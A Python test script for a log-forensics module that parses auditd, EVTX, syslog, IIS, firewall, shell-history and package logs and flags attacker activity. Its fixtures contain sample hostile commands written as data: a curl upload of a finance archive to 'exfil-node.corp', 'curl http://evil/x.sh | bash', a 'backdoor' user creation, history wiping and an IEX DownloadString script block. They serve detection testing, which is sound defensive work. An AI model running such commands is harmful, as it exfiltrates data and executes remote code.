"""日志格式扩展自测：Linux auditd + Windows EVTX。

    ./.venv/bin/python tests/log_extra_e2e.py

两个格式此前都落进"未识别日志格式"，报告只剩一行提示。这里验证：
- auditd：SYSCALL/EXECVE/CWD 能合并成一次执行，打包/外传能被点名；
- EVTX：字段能抠出来；缺 python-evtx 时给的是可执行的提示而不是空报告；
- 报告本身要有 文件/统计/时间线/发现/明细 这几段（用户反馈"报告不详细"）。
"""

from __future__ import annotations

import pathlib
import sys
import tempfile

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

from ctfops import logx                       # noqa: E402
from ctfops.config import load_config          # noqa: E402

PASS, FAIL = 0, []


def check(name: str, cond: bool, detail: str = "") -> None:
    global PASS
    if cond:
        PASS += 1
        print(f"  ✓ {name}")
    else:
        FAIL.append(name)
        print(f"  ✗ {name} {detail}")


AUDIT = """\
Nov  6 22:03:12 SRV-FS01 audispd[12000]: type=SYSCALL msg=audit(1793973792.000:88201): arch=c000003e syscall=59 success=yes exit=0 items=1 ppid=28841 pid=28861 auid=1002 uid=0 gid=0 euid=0 tty=pts/0 ses=2 comm="tar" exe="/bin/tar"
Nov  6 22:03:12 SRV-FS01 audispd[12001]: type=EXECVE msg=audit(1793973792.000:88202): argc=5 a0="/bin/tar" a1="czf" a2="/tmp/.cache/fs_backup_20261106.tgz" a3="--exclude=*.log" a4="/data/finance/2026Q3"
Nov  6 22:03:12 SRV-FS01 audispd[12002]: type=CWD msg=audit(1793973792.000:88203): cwd="/root"
Nov  6 22:41:07 SRV-FS01 audispd[12010]: type=SYSCALL msg=audit(1793976067.000:88211): syscall=59 success=yes auid=1002 uid=0 comm="curl" exe="/usr/bin/curl"
Nov  6 22:41:07 SRV-FS01 audispd[12011]: type=EXECVE msg=audit(1793976067.000:88212): argc=8 a0="/usr/bin/curl" a1="-s" a2="-X" a3="POST" a4="https://exfil-node.corp/upload" a5="--data-binary" a6="@/tmp/.cache/fs_backup_20261106.tgz"
Nov  6 22:58:31 SRV-FS01 audispd[12020]: type=SYSCALL msg=audit(1793977111.000:88221): syscall=59 success=yes auid=1002 comm="useradd" exe="/usr/sbin/useradd"
Nov  6 22:58:31 SRV-FS01 audispd[12021]: type=EXECVE msg=audit(1793977111.000:88222): argc=3 a0="/usr/sbin/useradd" a1="-m" a2="backdoor"
"""

EVTX_XML = """<?xml version="1.0" encoding="utf-8"?>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID Qualifiers="0">4625</EventID>
    <TimeCreated SystemTime="2020-07-22 02:50:57.123456+00:00"/>
    <Computer>WIN-WH8G5MDPHE5</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">Administrator</Data>
    <Data Name="IpAddress">192.168.222.200</Data>
    <Data Name="LogonType">3</Data>
  </EventData>
</Event>
"""


def main() -> int:
    tmp = pathlib.Path(tempfile.mkdtemp(prefix="ctfops-logx-"))
    cfg = load_config()
    cfg.workdir = tmp
    cfg.ensure_dirs()
    cfg.ai.enabled = False

    print("\n[1] auditd：多条记录合并成一次执行")
    events = logx.parse_audit(AUDIT)
    check("事件数 = 3（不是 8 条原始记录）", len(events) == 3, str(len(events)))
    cmds = [e.get("cmd") for e in events]
    check("tar 参数被拼完整",
          any("tar czf /tmp/.cache/fs_backup_20261106.tgz" in (c or "") for c in cmds),
          str(cmds)[:200])
    check("记录了 auid", any(e.get("auid") == "1002" for e in events), str(events[0].get("auid")))

    print("\n[2] auditd：打包 / 外传 / 建号 都能点名")
    rep = logx.analyze_audit(AUDIT, "SRV-FS01")
    titles = [f.title for f in rep.findings]
    check("识别数据打包", any("数据打包" in t for t in titles), str(titles))
    check("识别对外传输", any("对外传输" in t for t in titles), str(titles))
    check("识别账号变更", any("账号变更" in t for t in titles), str(titles))
    check("统计里有 Top 进程", "Top 进程" in rep.stats, str(list(rep.stats)))
    check("时间线按时间给命令",
          any("exfil-node.corp" in t for t in rep.timeline), str(rep.timeline)[:200])

    print("\n[3] EVTX：字段抽取")
    f = logx._evtx_fields(EVTX_XML)
    check("EventID", f.get("EventID") == "4625", f.get("EventID"))
    check("时间", (f.get("Time") or "").startswith("2020-07-22"), f.get("Time"))
    check("主机", f.get("Computer") == "WIN-WH8G5MDPHE5", f.get("Computer"))
    check("账号", f.get("TargetUserName") == "Administrator", f.get("TargetUserName"))
    check("源 IP", f.get("IpAddress") == "192.168.222.200", f.get("IpAddress"))

    print("\n[4] 缺库时给可执行的提示（不是空报告）")
    old = logx.evtx_reader
    logx.evtx_reader = lambda: None
    try:
        bad = tmp / "x.evtx"
        bad.write_bytes(b"ElfFile\x00" + b"\x00" * 100)
        r = logx.analyze_evtx(str(bad))
        text = r.text()
        check("有明确提示", "python-evtx" in text or "EVTX 解析库" in text, text[:120])
        check("说明替代方案", "wevtutil" in text or "pip install" in text)
    finally:
        logx.evtx_reader = old

    print("\n[5] 格式分发")
    audit_file = tmp / "audit.log"
    audit_file.write_text(AUDIT, encoding="utf-8")
    r2 = logx.analyze_file(str(audit_file), cfg)
    check("audit.log 走 audit 分支", r2.kind == "audit", r2.kind)
    check("不用 AI 也有内容", len(r2.text()) > 200, str(len(r2.text())))

    other = tmp / "weird.txt"
    other.write_text("这是一段认不出格式的文本\n第二行\n第三行\n", encoding="utf-8")
    r3 = logx.analyze_file(str(other), cfg)
    check("未知格式标记 generic", r3.kind == "generic", r3.kind)
    check("未识别也要带样本", bool(r3.samples), str(r3.samples))
    check("报告里有原始样本段", "原始样本" in r3.text(), r3.text()[:120])

    print("\n[6] 报告结构（用户反馈报告不详细）")
    t = r2.text()
    for sec in ("## 文件", "## 统计", "## 时间线", "## 发现", "## 明细"):
        check(f"含 {sec}", sec in t, t[:80].replace("\n", " "))
    check("明细按条列出", any("EXECVE" in d or "curl" in d for d in r2.detail), str(r2.detail[:1]))

    print("\n[7] 多格式识别：syslog / auth / W3C(IIS·防火墙) / 历史 / 包管理")
    cases = {
        "messages.log": (
            "Nov  6 22:03:12 web01 sshd[1234]: Failed password for root from 45.13.22.101 port 40001 ssh2\n"
            "Nov  6 22:03:20 web01 sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/bin/tar czf /tmp/a.tgz /data\n"
            "Nov  6 22:04:00 web01 CRON[999]: (root) CMD (curl -s http://evil/x.sh | bash)\n"
            "Nov  6 22:05:00 web01 kernel: Out of memory: Killed process 4242 (php-fpm)\n"
            "Nov  6 22:06:00 web01 systemd[1]: Started session-3.scope.\n",
            "syslog", ("可疑计划任务", "认证失败")),
        "auth.log": (
            "Nov  6 22:03:12 web01 sshd[1]: Failed password for root from 45.13.22.101 port 40001 ssh2\n"
            "Nov  6 22:03:15 web01 sshd[1]: Accepted password for root from 45.13.22.101 port 40002 ssh2\n"
            "Nov  6 22:03:20 web01 sudo: deploy : TTY=pts/0 ; COMMAND=/bin/bash\n",
            "auth", ()),
        "iis.log": (
            "#Software: Microsoft Internet Information Services 10.0\n"
            "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip "
            "cs(User-Agent) sc-status\n"
            "2020-07-22 02:50:57 10.0.0.5 GET /upload.aspx - 80 - 192.168.222.200 sqlmap/1.4.7 400\n"
            "2020-07-22 02:51:20 10.0.0.5 GET /../../etc/passwd - 80 - 192.168.222.200 curl/7.68 404\n",
            "w3c-iis", ("扫描器 UA", "路径穿越")),
        "pfirewall.log": (
            "#Software: Microsoft Windows Firewall\n"
            "#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags\n"
            "2020-07-22 03:00:00 DROP TCP 45.13.22.101 10.0.0.5 4444 445 60 S\n"
            "2020-07-22 03:00:05 DROP TCP 45.13.22.101 10.0.0.5 4445 445 60 S\n",
            "w3c-fw", ("防火墙拦截",)),
        "bash_history": (
            "#1700000000\nwhoami\n#1700000100\ncurl -s http://evil/x.sh | bash\n"
            "#1700000200\ntar czf /tmp/fs.tgz /data/finance\n#1700000300\nhistory -c\n",
            "history", ("远程脚本直接执行", "痕迹清理")),
        "dpkg.log": (
            "2026-11-06 22:00:01 install netcat:amd64 <none> 1.10-47\n"
            "2026-11-06 22:10:00 install nmap:amd64 <none> 7.80\n",
            "pkg", ("安装可疑/攻击工具",)),
    }
    for fname, (content, want_kind, want_titles) in cases.items():
        f = tmp / fname
        f.write_text(content, encoding="utf-8")
        r = logx.analyze_file(str(f), cfg)
        check(f"{fname} → {want_kind}", r.kind == want_kind, r.kind)
        titles = " ".join(x.title for x in r.findings)
        for t in want_titles:
            check(f"{fname} 命中「{t}」", t in titles, titles[:100])

    print("\n[8] wevtutil 导出（文本 + XML/Sysmon）")
    wt = tmp / "wevtutil.txt"
    wt.write_text(
        "Event[0]:\n  Log Name: Security\n  Source: Microsoft-Windows-Security-Auditing\n"
        "  Date: 2020-07-22T02:50:57.123\n  Event ID: 7045\n  Computer: WIN-WH8G5MDPHE5\n"
        "  Description:\n\tService Name: VaiGekem\n", encoding="utf-8")
    r = logx.analyze_file(str(wt), cfg)
    check("文本导出 → wevtutil-text", r.kind == "wevtutil-text", r.kind)
    check("能认出服务安装", any("服务" in x.title for x in r.findings),
          str([x.title for x in r.findings]))

    xml = (tmp / "sysmon.xml")
    xml.write_text(
        '<?xml version="1.0"?><Events>'
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
        '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
        '<TimeCreated SystemTime="2020-07-22T02:51:30.000+00:00"/>'
        '<Computer>WIN</Computer></System><EventData>'
        '<Data Name="CommandLine">powershell -enc SQBFAFgA</Data></EventData></Event>'
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
        '<Provider Name="Microsoft-Windows-PowerShell"/><EventID>4104</EventID>'
        '<TimeCreated SystemTime="2020-07-22T02:51:40.000+00:00"/>'
        '<Computer>WIN</Computer></System><EventData>'
        '<Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString(1)</Data>'
        '</EventData></Event></Events>', encoding="utf-8")
    r2 = logx.analyze_file(str(xml), cfg)
    check("XML 导出 → wevtutil-xml", r2.kind == "wevtutil-xml", r2.kind)
    titles = " ".join(x.title for x in r2.findings)
    check("Sysmon 1 号事件按命令行判定", "PowerShell" in titles, titles[:120])
    check("PowerShell 脚本块被点名", "脚本块" in titles, titles[:120])

    print("\n[9] EVTX 真实文件（有样例才跑）")
    sample = pathlib.Path("evidence/uploads/20261116-211104/WindowsR2.evtx")
    if sample.is_file() and logx.evtx_reader():
        r4 = logx.analyze_evtx(str(sample), "WIN-WH8G5MDPHE5")
        check("事件数 > 100", int(r4.stats.get("事件数") or 0) > 100, str(r4.stats.get("事件数")))
        check("有 Top EventID", "Top EventID" in r4.stats, str(list(r4.stats)))
        check("有账号统计", "Top 账号" in r4.stats, str(list(r4.stats)))
    else:
        print("  （跳过：没有样例文件或缺库）")

    print("\n" + "=" * 40)
    print(f"通过 {PASS} 项，失败 {len(FAIL)} 项")
    if FAIL:
        print("失败：" + ", ".join(FAIL))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
